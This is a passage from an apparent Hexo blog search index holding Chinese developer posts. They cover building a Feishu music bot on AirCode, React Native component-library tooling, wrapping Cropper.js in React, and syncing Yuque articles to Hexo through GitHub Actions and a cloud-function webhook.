ImagesTable = aircode.db.table(&quot;images&quot;); // 查询数据库 const result = await ImagesTable.where(&#123; url &#125;).find(); if (result.length &gt; 0) &#123; return result[0].imageKey; &#125; // 添加 param=200y200 的参数，使用小尺寸图片 const splitUrl = url.split(&quot;?&quot;); const querys = querystring.parse(splitUrl[1] || &quot;&quot;); const queryString = querystring.stringify(&#123; ...querys, param: &quot;200y200&quot; &#125;); const newUrl = `$&#123;splitUrl[0]&#125;?$&#123;queryString&#125;`; // 上传图片到飞书中 const response = await axios.get(newUrl, &#123; responseType: &quot;arraybuffer&quot; &#125;); const &#123; image_key &#125; = await client.im.image.create(&#123; data: &#123; image_type: &quot;message&quot;, image: Buffer.from(response.data, &quot;utf-8&quot;), &#125;, &#125;); // 保存到数据库中 ImagesTable.save(&#123; url: newUrl, imageKey: image_key, &#125;); return image_key;&#125;; 新建 search.js 文件 使用网易云音乐的搜索接口根据关键词搜索音乐，可以根据该文档自建 API，这里不多赘述了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445const axios = require(&quot;axios&quot;);const imageUpload = require(&quot;./image&quot;);const request = axios.create(&#123; baseURL: process.env.music_api,&#125;);// 搜索歌曲module.exports = async function (params) &#123; const &#123; keyword &#125; = params; const result = await request.get(`/search?keywords=$&#123;keyword&#125;&amp;type=1018`); // 取前三首 const songs = result.data.result.song.songs.slice(0, 3); const _list = await songs.map((data) =&gt; &#123; const artistNames = data.ar.length ? [...data.ar] .reverse() .reduce((ac, a) =&gt; `$&#123;a.name&#125; $&#123;ac&#125;`, &quot;&quot;) .trim() : &quot;&quot;; return &#123; imgUrl: data.al.picUrl, title: `$&#123;data.name&#125;`, desc: `$&#123;artistNames&#125; · $&#123;data.al.name&#125;`, artistId: data.ar[0].id, albumId: data.al.id, artistName: artistNames, albumName: data.al.name, id: data.id, &#125;; &#125;); const imageKeys = await Promise.all( _list.map((data) =&gt; imageUpload(&#123; url: data.imgUrl &#125;)) ); const list = _list.map((data, index) =&gt; (&#123; ...data, imageKey: imageKeys[index], &#125;)); return list;&#125;; 新建 reaction.js 文件 该文件就是用来生成消息卡片富文本，富文本 JSON 可以先在飞书的消息卡片搭建工具搭建好，再复制到该文件中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 生成消息卡片const generatePath = (id) =&gt; &#123; return `https://applink.feishu.cn/client/web_app/open?appId=$&#123;process.env.app_id&#125;&amp;mode=sidebar&amp;id=$&#123;id&#125;`;&#125;;const generateHeader = (keyword) =&gt; &#123; return &#123; template: &quot;turquoise&quot;, title: &#123; content: `🎵 $&#123;keyword&#125;`, tag: &quot;plain_text&quot;, &#125;, &#125;;&#125;;const generateCard = (data) =&gt; &#123; return &#123; tag: &quot;div&quot;, text: &#123; tag: &quot;lark_md&quot;, content: `**$&#123;data.title&#125;** $&#123;data.desc&#125; [打开播放器]($&#123;generatePath( data.id )&#125;)`, &#125;, extra: &#123; tag: &quot;img&quot;, img_key: data.imageKey, alt: &#123; tag: &quot;plain_text&quot;, content: data.title, &#125;, &#125;, &#125;;&#125;;module.exports = (&#123; keyword, list &#125;) =&gt; &#123; console.log(&quot;search keyword: &quot;, keyword); console.log(&quot;search result: &quot;, list); const header = generateHeader(keyword); const elements = list.reduce((result, item, index) =&gt; &#123; const card = generateCard(item); if (index &gt; 0) &#123; result.push(&#123; tag: &quot;hr&quot; &#125;); &#125; return [...result, card]; &#125;, []); return &#123; config: &#123; wide_screen_mode: true, &#125;, elements, header, &#125;;&#125;; 新建 index.js 文件 最后再新建个入口文件，集成下前面的几个模块： 首先飞书开放平台会向接口发送个验证请求，请求为 JSON 格式，带 challenge 参数。应用接收此请求后，需解析出 challenge 值，并在 1 秒内回复 challenge 值。可以通过 params.type &#x3D;&#x3D;&#x3D; ‘url_verification’ 来判断请求是否是验证请求。 通过 register 方法注册事件的回调，目前我们只订阅了 im.message.receive_v1这一个事件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// @see https://docs.aircode.io/guide/functions/const aircode = require(&quot;aircode&quot;);const lark = require(&quot;@larksuiteoapi/node-sdk&quot;);const client = require(&quot;./client&quot;);const search = require(&quot;./search&quot;);const reaction = require(&quot;./reaction&quot;);const sendMessage = (chatId, content, type = &quot;text&quot;) =&gt; &#123; return client.im.message.create(&#123; params: &#123; receive_id_type: &quot;chat_id&quot;, &#125;, data: &#123; receive_id: chatId, content: JSON.stringify(content), msg_type: type, &#125;, &#125;);&#125;;const eventDispatcher = new lark.EventDispatcher(&#123;&#125;).register(&#123; &quot;im.message.receive_v1&quot;: async (data) =&gt; &#123; const open_chat_id = data.message.chat_id; const msg = JSON.parse(data.message.content).text; const keyword = msg.replace(/^@\\w+/, &quot;&quot;).trim(); let res; if (!keyword) &#123; res = await sendMessage(open_chat_id, &#123; text: &quot;请告诉我一些关键词，比如歌名，歌手名，歌单名，用户名等~&quot;, &#125;); &#125; else &#123; const list = await search(&#123; keyword &#125;); const interactive = reaction(&#123; keyword, list &#125;); res = await sendMessage(open_chat_id, interactive, &quot;interactive&quot;); &#125; return res; &#125;,&#125;);module.exports = async function (params, context) &#123; console.log(&quot;Received params:&quot;, params); // url 验证 if (params.type === &quot;url_verification&quot;) &#123; return &#123; challenge: params.challenge &#125;; &#125; // 根据 message_id 去重复消息 const message_id = params.event.message.message_id; const LogsTable = aircode.db.table(&quot;logs&quot;); const findResult = await LogsTable.where(&#123; message_id &#125;).find(); if (findResult.length &gt; 0) return `重复消息 - $&#123;message_id&#125;`; LogsTable.save(&#123; message_id &#125;); return await eventDispatcher.invoke(params);&#125;; 点击 Deploy按钮，发布所有函数，复制 index.js 的公网请求路径到飞书应用设置中 总结AirCode 用来开发机器人相当方面，替我们省掉了数据库，文件服务，线上运维等一系类繁琐的事情，使用一个浏览器就能快速的开发上线。再搭配上 Github Page 就能白嫖到底。","tags":["React","AirCode"],"categories":["tools"]},{"title":"React Native 组件库 - 脚手架","path":"/2023/02/06/8f5436bb4e35/","content":"作为一个前端 er，谁不想拥有一个自己的组件库。我也想，所以它来了 - rn-vant，使用 vant 设计规范的 React Native 组件库。 组件库目前已经拥有了 40+ 组件（虽然还是很简陋，bug 也是一堆，主要还是我太懒了 😅），也算圆了我的一个梦想，现在是时候做个阶段总结了，将这段时间开发遇到的问题都记录下来，一方面是怕自己忘了，另一方面也是给看到这系列文件的朋友做个参考。 Mono or Multi Repo from https://juejin.cn/post/6949882490324516894#heading-9 这里简单解释下什么是 MonoRepo 以及 MultiRepo，以及他们的优缺点： MonoRepo：把多个项目放在一个仓库里面管理。 MultiRepo：每个项目都对应着一个单独的代码仓库每个项目进行分散管理。 MonoRepo 优缺点： 优点： 统一了工作流：由于所有的项目放在一个仓库当中，复用起来非常方便，如果有依赖的代码变动，那么用到这个依赖的项目当中会立马感知到 降低基建成本：所有项目复用一套标准的工具和规范，无需切换开发环境，如果有新的项目接入，也可以直接复用已有的基建流程，比如 CI 流程、构建和发布流程。 提升团队协作效率：一方面大家都在一个仓库开发，能够方便地共享和复用代码，方便检索项目源码，另一方面，git commit 的历史记录也支持以功能为单位进行提交，之前对于某个功能的提交，需要改好几个仓库，提交多个 commit，现在只需要提交一次，简化了 commit 记录，方便协作。 缺点： 体积问题：因为所有 code 都在一个 repo 下，这就导致了随着项目越来越复杂，整个 repo 的体积会变得很大。据说某大公司员工想要修改项目中的某个小样式，需要将数以十 G 的 repo 拉到本地，听起来确实是个噩梦。 权限问题：Monorepo 模式下的权限是开放的。代码安全，文档安全，都会是一个需要好好考虑的问题。这个方面如果处理不好的话，对整个团队整个项目带来的后果可能是灾难性的。 版本控制：仓库变得太大，对版本控制技术会有很大的挑战。因为 Git 社区建议的是使用更多更小的代码库，Git 本身并不适合单个巨大的代码库。 Monorepo 和 Multirepo 都是管理组织代码的方式，并没有什么优劣之分，还是那句话“存在即合理”，工具都是用来服务生产的，能更有效解决当下问题的，就是更好的。回到组件库上，按照最初的规划，组件库最少会产出两个 npm 包，组件库本体和 icon 组件，并且组件库会依赖 icon 组件，自然采用 Monorepo 的方式是最好的。 Monorepo 工具既然选择了 Monorepo，自然就需要看看社区里有哪些好的 Monorepo 工具： Bit：用于组件驱动开发的工具链 Turborepo：用于 JavaScript 和 TypeScript 代码库的高性能构建系统。 Rush：一个可扩展的 web 单仓库管理器。 Nx：具有一流的 monorepo 支持和强大集成的下一代构建系统。 Lerna：用于管理包含多个软件包的项目 上面这些工具中，我最熟悉的就是 Lerna 了，简单而不简陋，完全能够胜任组件库编排的工作，因此首选 Lerna 了。（性能确实不如其他的工具，比如 Turborepo，但是目前也并没有太大的性能诉求，以后遇到了，可以在迁移） 组件库构建工具我们的组件库最终是需要发布到 npm 上的，因为组件库的运行环境不在浏览器中，因此只需要提供 ES Module和 CommonJS模块的组件即可，另外如果是 Typescript 工程，构建时还需要输出类型文件，在调研社区开源的组件库会锁定一个工具 - react-native-builder-bob 安装 react-native-builder-bob: 1yarn add react-native-builder-bob -D 配置及使用都很简单，在 package.json 中新增如下配置： 12345678910111213141516171819&#123; &quot;scripts&quot;: &#123; &quot;build&quot;: &quot;bob build&quot; &#125;, &quot;react-native-builder-bob&quot;: &#123; &quot;source&quot;: &quot;src&quot;, &quot;output&quot;: &quot;lib&quot;, &quot;targets&quot;: [ &quot;commonjs&quot;, &quot;module&quot;, [ &quot;typescript&quot;, &#123; &quot;project&quot;: &quot;tsconfig.build.json&quot; &#125; ] ] &#125;&#125; 运行 yarn build后，会在 lib 目录下生成相应模块的文件： 最后在 package.json 中，添加这些模块的入口说明： 1234567&#123; &quot;main&quot;: &quot;lib/commonjs/index&quot;, &quot;module&quot;: &quot;lib/module/index&quot;, &quot;types&quot;: &quot;lib/typescript/index.d.ts&quot;, &quot;react-native&quot;: &quot;src/index&quot;, &quot;source&quot;: &quot;src/index&quot;&#125; 代码质量 and 代码风格代码质量目前只配置了 eslint，后面如果有更好的工具，可以尝试接入。现在使用的是 https://github.com/youngjuning-archive/eslint-config 这个，主要看中它将 prettier 和 eslint 集成到一起了，省了自己配置（prettier 和 eslint 有些规则是冲突的，解决起来超级麻烦），而且 eslint 的规则来自 airbnb，代码质量也有了保障。 代码风格用的是 prettier，因为已经集成到 @youngjuning/eslint-config了，只需要安装 @youngjuning/prettier-config，并简单配置下就能使用了。 12// .prettierrc.jsmodule.exports = require(&quot;@youngjuning/prettier-config&quot;); 除了 eslint 和 prettier，我们还能借助一些工具，来帮助我们更好的组织代码： husky：管理 git hook 的工具，可以在 git commit 时，强制校验和格式化代码。 lint-staged：针对 git 暂存文件执行一些脚本，结合 husky 可以实现只对改动的文件，校验和格式化，毕竟改一行代码就要校验整个仓库成本还是太高了。 commitlint：git commit messages 风格校验工具。 至于如何在 lerna 项目中如何集成这些工具，可以看我的另一篇博客 【lerna 项目中集成 husky、lint-staged、commitlint 和 cz-customizable】，里面做了详细的说明。 总结本文主要介绍了开发一个组件库需要的一些工具的选型，实际上这些工具熟悉前端工程化的同学都不会陌生，具体的配置可以参考我的组件库项目 - rn-vant。后面我会再介绍下组件方的文档及 CI&#x2F;CD 的相关配置。","tags":["React","React Native"],"categories":["React Native","组件库"]},{"title":"Cropper.js 实践","path":"/2023/02/02/1b69b3598f64/","content":"背景前段时间接了个需求，需要做个图片上传，预览及裁切服务，调研了下社区的开源方案，cropperjs 进入视野，简单看了下 README，完美符合我的需求，最终实现效果如下： 安装没啥好说的，直接 yarn 走起： 1yarn add cropperjs 引入 CSS 文件： 1import &quot;cropperjs/dist/cropper.css&quot;; 封装简单的分析下需求，整个图片裁切包含以下几个部件： 图片裁切框 - 包含「网页端」和「移动端」，需要分开裁切 替换图片按钮 - 替换图片后，「网页端」和「移动端」都需要替换 图片预览 - 同样「网页端」和「移动端」也需要分开预览 Cropper.js 是个原生的裁切库，在我们的 React 项目中按照上面的功能划分封装成以下几个组件： Upload.tsx 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; useContext, memo &#125; from &quot;react&quot;;import &#123; Upload as PDUpload &#125; from &quot;@universe-design/react&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;type UploadProps = &#123; maxSize?: number; children?: React.ReactNode; accept?: string;&#125;;export const Upload = memo((props: UploadProps): JSX.Element =&gt; &#123; const &#123; accept = &quot;image/*&quot;, maxSize &#125; = props; const &#123; setSrc &#125; = useContext(CropperContext); const beforeUpload = (file: File) =&gt; &#123; // 检查文件大小 if (file.size &amp;&amp; maxSize &amp;&amp; file.size &gt; maxSize) &#123; return PDUpload.LIST_IGNORE; &#125; const reader = new FileReader(); reader.onload = () =&gt; &#123; setSrc?.(reader.result as string); &#125;; reader.readAsDataURL(file); return false; &#125;; return ( &lt;PDUpload maxCount=&#123;1&#125; beforeUpload=&#123;beforeUpload&#125; fileList=&#123;[]&#125; accept=&#123;accept&#125; &gt; &#123;props.children&#125; &lt;/PDUpload&gt; );&#125;); 这个组件的功能很简单，就是使用组件库的上传组件获取文件的 base64，然后保存到 context 里，方便裁切组件消费。 Context.tsx 12345678910111213141516171819202122232425262728293031323334import React, &#123; createContext, FC, useMemo, useState, useRef &#125; from &quot;react&quot;;import &#123; uniqueId &#125; from &quot;lodash&quot;;export interface CropperState &#123; src?: string | undefined; setSrc: (src: string) =&gt; void; previewClass: string;&#125;export interface CropperProviderProps &#123; src?: string | undefined;&#125;export const CropperContext = createContext&lt;CropperState&gt;(&#123;&#125; as CropperState);export const CropperProvider: FC&lt;CropperProviderProps&gt; = (props) =&gt; &#123; const [src, setSrc] = useState(props.src); const previewClass = useRef(uniqueId(&quot;image_preview_&quot;)); const contextState = useMemo&lt;CropperState&gt;( () =&gt; (&#123; src, setSrc, previewClass: previewClass.current, &#125;), [src] ); return ( &lt;CropperContext.Provider value=&#123;contextState&#125;&gt; &#123;props.children&#125; &lt;/CropperContext.Provider&gt; );&#125;; Prview.tsx 1234567891011121314151617181920212223242526import React, &#123; useContext, memo &#125; from &quot;react&quot;;import classnames from &quot;classnames&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;export interface PreviewProps extends React.HTMLAttributes&lt;HTMLDivElement&gt; &#123; name?: string;&#125;export const Preview: React.FC&lt;PreviewProps&gt; = memo((props) =&gt; &#123; const &#123; name = &quot;default&quot;, className, children, ...rest &#125; = props; const &#123; previewClass &#125; = useContext(CropperContext); return ( &lt;div &#123;...rest&#125; className=&#123;classnames( `$&#123;previewClass&#125;-$&#123;name&#125;`, styles[&quot;image-preview&quot;], className )&#125; &gt; &#123;children&#125; &lt;/div&gt; );&#125;); 预览组件本身也不复杂，就是需要注意的是，Cropper.js 的 preview 参数可以是个元素，元素数组或者能够被 Document.querySelectorAll 选中的 class 选择器，因为封装成了通用组件，因此使用了 lodash 的 uniqueId 方法生成唯一的 class，防止页面出现多个 Prview 组件时，class 类名冲突。 Cropper.tsx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import React, &#123; useContext, memo, useRef, useEffect &#125; from &quot;react&quot;;import Cropper from &quot;cropperjs&quot;;import &#123; useMemoizedFn, useInViewport, useUpdateLayoutEffect &#125; from &quot;ahooks&quot;;import classnames from &quot;classnames&quot;;import &quot;cropperjs/dist/cropper.css&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;type CropperOptions = Cropper.Options&lt;HTMLImageElement&gt;;type ReactCropperProps = Pick&lt;CropperOptions, &quot;aspectRatio&quot;&gt; &amp; &#123; name?: string; style?: React.CSSProperties; className?: string; alt?: string; src?: string; data?: Cropper.Data; onCrop?: (data: Cropper.Data) =&gt; void; // 监听裁切框的变动&#125;;interface ReactCropperElement extends HTMLImageElement &#123; cropper: Cropper;&#125;export type ReactCropperRef = Cropper;const REQUIRED_IMAGE_STYLES = &#123; opacity: 0, maxWidth: &quot;100%&quot; &#125;;const ReactCropper = React.forwardRef&lt;ReactCropperRef, ReactCropperProps&gt;( (props, ref) =&gt; &#123; const &#123; name = &quot;default&quot;, style, className, alt = &quot;picture&quot;, aspectRatio, data, onCrop, &#125; = props; const boxRef = useRef&lt;HTMLDivElement&gt;(null); const combinedRef = useRef&lt;ReactCropperElement&gt;(null); const cropperState = useContext(CropperContext); // 是否在可是区域内 const [inViewport] = useInViewport(boxRef); const src = cropperState?.src || props?.src; const preSrc = useRef&lt;string | undefined&gt;(src); const preview = `.$&#123;cropperState.previewClass&#125;-$&#123;name&#125;`; React.useImperativeHandle(ref, () =&gt; combinedRef.current!.cropper); /** * 满足以下条件才能重新 render * 1. src 地址变更 * 2. 在可是区域内（如果不在可视区域，render 时会出问题） */ useEffect(() =&gt; &#123; if ( combinedRef.current?.cropper &amp;&amp; typeof src !== &quot;undefined&quot; &amp;&amp; inViewport &amp;&amp; src !== preSrc.current ) &#123; combinedRef.current.cropper.reset().clear().replace(src); preSrc.current = src; &#125; &#125;, [inViewport, src]); const handleCrop = useMemoizedFn(() =&gt; &#123; if (combinedRef.current?.cropper) &#123; onCrop?.(combinedRef.current?.cropper.getData()); &#125; &#125;); useUpdateLayoutEffect(() =&gt; &#123; data &amp;&amp; combinedRef.current?.cropper.setData(data); &#125;, [data]); useUpdateLayoutEffect(() =&gt; &#123; aspectRatio &amp;&amp; combinedRef.current?.cropper.setAspectRatio(aspectRatio); &#125;, [aspectRatio]); useEffect(() =&gt; &#123; if (combinedRef.current !== null) &#123; // eslint-disable-next-line no-new new Cropper(combinedRef.current, &#123; viewMode: 1, // 限制裁剪框不能超出图片的范围 dragMode: &quot;crop&quot;, // 拖拽图片时形成新的裁剪框 guides: true, // 是否显示裁剪框的虚线 scalable: false, // 是否可以缩放图片（可以改变长宽） zoomable: false, // 是否可以缩放图片（改变焦距） zoomOnTouch: false, // 是否可以通过拖拽触摸缩放图片 zoomOnWheel: false, // 是否可以通过鼠标滚轮缩放图片 center: false, // 是否显示裁剪框中间的 ‘+’ 指示器 responsive: false, // 是否在窗口尺寸调整后 进行响应式的重渲染 movable: false, // 是否可以移动图片 preview, aspectRatio, // 设置裁剪框为固定的宽高比 data, // 之前存储的裁剪后的数据 在初始化时会自动设置 crop: handleCrop, &#125;); &#125; return () =&gt; &#123; combinedRef.current?.cropper?.destroy(); &#125;; // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, [preview, handleCrop]); return ( &lt;div style=&#123;style&#125; className=&#123;classnames(styles.cropper, className)&#125; ref=&#123;boxRef&#125; &gt; &lt;img src=&#123;src&#125; alt=&#123;alt&#125; style=&#123;REQUIRED_IMAGE_STYLES&#125; ref=&#123;combinedRef&#125; /&gt; &lt;/div&gt; ); &#125;);export default memo(ReactCropper); 最后就是重头戏的 Cropper 了，组件内部封装了 Cropper.js 初始化逻辑，图片切换的逻辑。 index.tsx 123456789101112131415import CropperInner from &quot;./Cropper&quot;;import &#123; CropperProvider &#125; from &quot;./Context&quot;;import &#123; Upload &#125; from &quot;./Upload&quot;;import &#123; Preview &#125; from &quot;./Preview&quot;;export * from &quot;./Cropper&quot;;export * from &quot;./Context&quot;;const Cropper = Object.assign(CropperInner, &#123; Upload, Provider: CropperProvider, Preview,&#125;);export default Cropper; 最后就是将这些组件全部挂载到 Cropper，对外只暴露 Cropper 这一个组件。 使用使用封装后的 Cropper 组件大概如下，其中 Cropper 组件和 Cropper.Preview 组件可以有任意多个，但是需要注意，两个组件的 name 字段要一一对应，否则会出现无法实时预览的情况。 123456789101112131415161718192021222324252627import Cropper from &quot;./Cropper&quot;;export default () =&gt; &#123; return ( &lt;Cropper.Provider src=&quot;xxxxx&quot;&gt; // 裁切组件 &lt;Cropper aspectRatio=&#123;PC_CROP_RATIO&#125; name=&quot;PC&quot; ref=&#123;(ref) =&gt; setRef(ref!, TYPE.web)&#125; className=&#123;styles[&quot;container-cropper&quot;]&#125; onCrop=&#123;(data) =&gt; handleCrop(data, TYPE.web)&#125; data=&#123;cacheValue.current?.tailored_info?.web&#125; /&gt; // 上传组件 &lt;Cropper.Upload accept=&#123;UPLOAD_ACCEPT&#125; maxSize=&#123;UPLOAD_MAX_SIZE&#125;&gt; &lt;Button type=&quot;link&quot;&gt;&#123;i18next.t(&quot;replace-image&quot;)&#125;&lt;/Button&gt; &lt;/Cropper.Upload&gt; // 预览组件 &lt;Cropper.Preview style=&#123;bannerStyle&#125; className=&#123;styles[&quot;preview-mobile&quot;]&#125; name=&quot;mobile&quot; /&gt; &lt;/Cropper.Provider&gt; );&#125;; 样式覆盖组件逻辑解决了，现在解决样式问题。我们之前引入了 cropperjs 的默认样式文件，现在只需要覆盖掉它的样式就可以了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// 复写 Cropper 的样式.cropper &#123; :global &#123; .cropper-modal &#123; opacity: 0.4; &#125; .cropper-line &#123; background-color: #fff; &#125; .cropper-point &#123; &amp;.point-e, &amp;.point-n, &amp;.point-w, &amp;.point-s &#123; display: none; &#125; &amp;.point-ne, &amp;.point-nw, &amp;.point-sw, &amp;.point-se &#123; width: 20px; height: 20px; background: transparent; opacity: 1; &#125; &amp;.point-nw, &amp;.point-ne &#123; border-top: 3px solid #fff; &#125; &amp;.point-nw, &amp;.point-sw &#123; border-left: 3px solid #fff; &#125; &amp;.point-ne, &amp;.point-se &#123; border-right: 3px solid #fff; &#125; &amp;.point-sw, &amp;.point-se &#123; border-bottom: 3px solid #fff; &#125; &#125; .cropper-view-box &#123; outline-color: #fff; &#125; .cropper-dashed &#123; border-style: solid; opacity: 1; &#125; &#125;&#125; 问题 获取裁切后图片 blob 图片裁切，需要获取裁切图片的 blob 上传到 CDN，Cropperjs 提供了获取 blob 的方法： 1cropper.getCroppedCanvas().toBlob((blob) =&gt; &#123;&#125;) 但是在我们业务的场景下，同时会存在两个裁切框分别用来裁切「网页端」和「移动端」，用的都是同一个图片，也就是说替换图片会同时替换「网页端」和「移动端」的图片。这就导致了替换图片后，只有当前激活的 tab 下的 cropper 调用 getCroppedCanvas 才能获取到替换图片后的数据，没有激活的 tab 下还是获取旧图片的数据。 复现路径： 除非在提交前，手动切换到移动端的 tab，不然该问题会一直存在，这是 cropperjs 内部实现的问题，我们不能要求用户多这么一个无意义的步骤，因此我们自己实现 「getCroppedCanvas」方法，不用 cropperjs 暴露的方法 1234567891011121314151617181920212223242526272829// 使用 canvas 裁切图片export const cropImage = (source: string, options: Options) =&gt; &#123; const &#123; width, height, x, y &#125; = options; const canvas = document.createElement(&quot;canvas&quot;); const context = canvas.getContext(&quot;2d&quot;)!; const image = new Image(); image.src = source; image.crossOrigin = &quot;anonymous&quot;; return new Promise&lt;HTMLCanvasElement&gt;((resolve) =&gt; &#123; image.onload = () =&gt; &#123; const [px, py, pw, ph] = [ inRange(x, 0, image.width) ? x : 0, inRange(y, 0, image.height) ? y : 0, inRange(width, 0, image.width) ? width : image.width, inRange(height, 0, image.height) ? height : image.height, ].map((param) =&gt; Math.floor(normalizeDecimalNumber(param))); canvas.width = pw; canvas.height = ph; context.imageSmoothingEnabled = true; context.imageSmoothingQuality = &quot;low&quot;; context.drawImage(image, px, py, pw, ph, 0, 0, pw, ph); context.restore(); resolve(canvas); &#125;; &#125;);&#125;;"},{"title":"语雀同步到 Github Hexo","path":"/2023/01/31/5e91c1995fd8/","content":"背景我的博客都是用 Hexo 在本地写完，提交个 commit 到 Github，触发 Github Action 自动部署到 Github Page 上。除了用 Vscode 写 Markdown 有点难受外，其它地方还好，至于为什么一定要用 Hexo + Github 的组合，白嫖 Github 的服务器它不香吗？ 但是，最近体验了下语雀，发现他的文本编辑器还是很不错的，写文档很是丝滑，正好在 Github 上发现了个项目 - https://github.com/x-cold/yuque-hexo，可以将语雀的文章同步到 Hexo 中，是时候改变下博客写作流程了。下面就记录了整个迁移过程。 安装及配置 yuque-hexo在 hexo 项目的根目录中执行以下命令，安装 yuque-hexo： 1yarn add yuque-hexo -D 1. 新增配置：123456789101112131415161718192021&#123; &quot;yuqueConfig&quot;: &#123; &quot;postPath&quot;: &quot;source/_posts/yuque&quot;, &quot;cachePath&quot;: &quot;yuque.json&quot;, &quot;mdNameFormat&quot;: &quot;title&quot;, &quot;adapter&quot;: &quot;hexo&quot;, &quot;concurrency&quot;: 5, &quot;baseUrl&quot;: &quot;https://www.yuque.com/api/v2&quot;, &quot;login&quot;: &quot;bijinfeng-fyjgs&quot;, &quot;repo&quot;: &quot;blog&quot;, &quot;onlyPublished&quot;: true, &quot;onlyPublic&quot;: false, &quot;imgCdn&quot;: &#123; &quot;concurrency&quot;: 0, &quot;imageBed&quot;: &quot;upyun&quot;, &quot;enabled&quot;: true, &quot;bucket&quot;: &quot;xxxx&quot;, &quot;prefixKey&quot;: &quot;yuque&quot; &#125; &#125;&#125; yuqueConfig 中每个字段的作用在 yuque-hexo 的 README 中都有说明，我这里挑几个重点的说下： login - 个人路径 repo - 知识库路径 2. 新增脚本这些脚本主要用在后面的 Github Action 中，当然也方便本地调试使用 1234567&#123; &quot;scripts&quot;: &#123; &quot;clean:yuque&quot;: &quot;yuque-hexo clean&quot;, &quot;sync&quot;: &quot;yuque-hexo sync&quot;, &quot;reset&quot;: &quot;npm run clean:yuque &amp;&amp; npm run sync&quot; &#125;&#125; 配置 Github Action在修改 Github Action 配置文件前，我们先需要获取几个 Token： YUQUE_TOKEN 新增或使用现有的 Token，Token 给个读取权限就行了 SECRET_ID &#x2F; SECRET_KEY 图床相关的密钥，我用的是又拍云，需要操作员的账号和密码（密码忘了的话，点击编辑按钮，重新生成个） 在 Github 项目的 Setting 中新增三个环境变量 上面的变量都准备好后，来到 hexo 项目的 .github&#x2F;workflows 目录，新增个 deploy.yml 文件: 123456789101112131415161718192021222324252627282930313233343536name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: environment: github-pages env: yuque_token: $&#123;&#123; secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $&#123;&#123; secrets.ACCESS_TOKEN &#125;&#125; publish_dir: ./public 或者你的项目中原本就有 Action 的配置，现在只需要增加 yuque-hexo 的相关配置就行： 消费上面设置的环境变量 注意 environment 字段必须和你在 Github Setting 中配置的 Environments 字段对应上 12345environment: github-pages env: yuque_token: $&#123;&#123; secrets.YUQUE_TOKEN &#125;&#125; secret_id: $&#123;&#123; secrets.SECRET_ID &#125;&#125; secret_key: $&#123;&#123; secrets.SECRET_KEY &#125;&#125; 在运行 hexo generate 之前，先同步语雀的文章 12- name: Sync Yuque run: YUQUE_TOKEN=$&#123;&#123; env.yuque_token &#125;&#125; SECRET_ID=$&#123;&#123; env.secret_id &#125;&#125; SECRET_KEY=$&#123;&#123; env.secret_key &#125;&#125; yarn sync 到这里 yueque-hexo 的配置工作就完成了，保存，提交 commit 到 GitHub 上触发 Action，如果一切顺利的话语雀的文章就会同步过来。 主动同步上面的动作完成后，我们虽然能够同步语雀的文章，但是我们在语雀写完文章后，还需要到 github 上手动触发下 Action，体验还是不够完美，为了解决这个问题，我们有两个方案： 定义任务给 Action 添加个定时任务，在每天的 2:00 同步一次语雀 123on: schedule: - cron: &quot;0 2 * * *&quot; webhook 在语雀写完文章后，自动触发个 webhook，启动 Github Action 同步文章 使用 API 远程触发 Github Action 现在 Action 只能在提交 commit 后触发，新增个配置，让 Action 支持被 api 触发： 123456789on: push: branches: - master # 允许外部仓库事件触发 repository_dispatch: types: # 这里的值需要和下文的云函数的event_type保持一致 - webhook 访问链接页面 https://github.com/settings/tokens/new 申请一个 Token，需要勾选 repo 权限。 API 调用格式 12345curl -X POST https://api.github.com/repos/:owner/:repo/dispatches \\ -H &quot;Accept: application/vnd.github.everest-preview+json&quot; \\ -H &quot;Authorization: token TRIGGER_TOKEN&quot; \\ --data &#x27;&#123;&quot;event_type&quot;: &quot;TRIGGER_EVENT&quot;&#125;&#x27; 其中，owner 是用户名，repo 是仓库名， TRIGGER_TOKEN 是上面申请的 Token 凭证，TRIGGER_EVENT 是自定义的事件名。 若是语雀支持自定义 webhook 格式，那么本文到这里就要结束了，可惜天公不作美，语雀只支持配置个接口 URL。那么我们就需要借助云函数来倒一手了，代理后的调用路径变成：语雀 webhook -&gt; 云函数 -&gt; gtihub api。 腾讯云函数 我这里使用的是腾讯云函数，其它云服务商的云函数只能自己探索了。 新建个云函数，我们只要做个接口转发，不用那么麻烦就不用模板了（作为前端 er 当然首选 node）： 下面编辑云函数: 123456789101112131415161718192021222324252627282930&quot;use strict&quot;;const request = require(&quot;request&quot;);exports.main_handler = async (event, context) =&gt; &#123; const res = await new Promise((resolve, reject) =&gt; &#123; request( &#123; url: &quot;https://api.github.com/repos/:owner/:repo/dispatches&quot;, method: &quot;POST&quot;, json: true, headers: &#123; &quot;User-Agent&quot;: &quot;curl/7.52.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, Authorization: &quot;token xxxxx&quot;, Accept: &quot;application/vnd.github.everest-preview+json&quot;, &#125;, body: &#123; event_type: &quot;webhook&quot; &#125;, &#125;, function (error, response, body) &#123; if (response.status_code == 204) &#123; resolve(response); &#125; else &#123; reject(error); &#125; &#125; ); &#125;); return res;&#125;; 触发器设置，触发方式选择「API 网关触发」，其它默认： 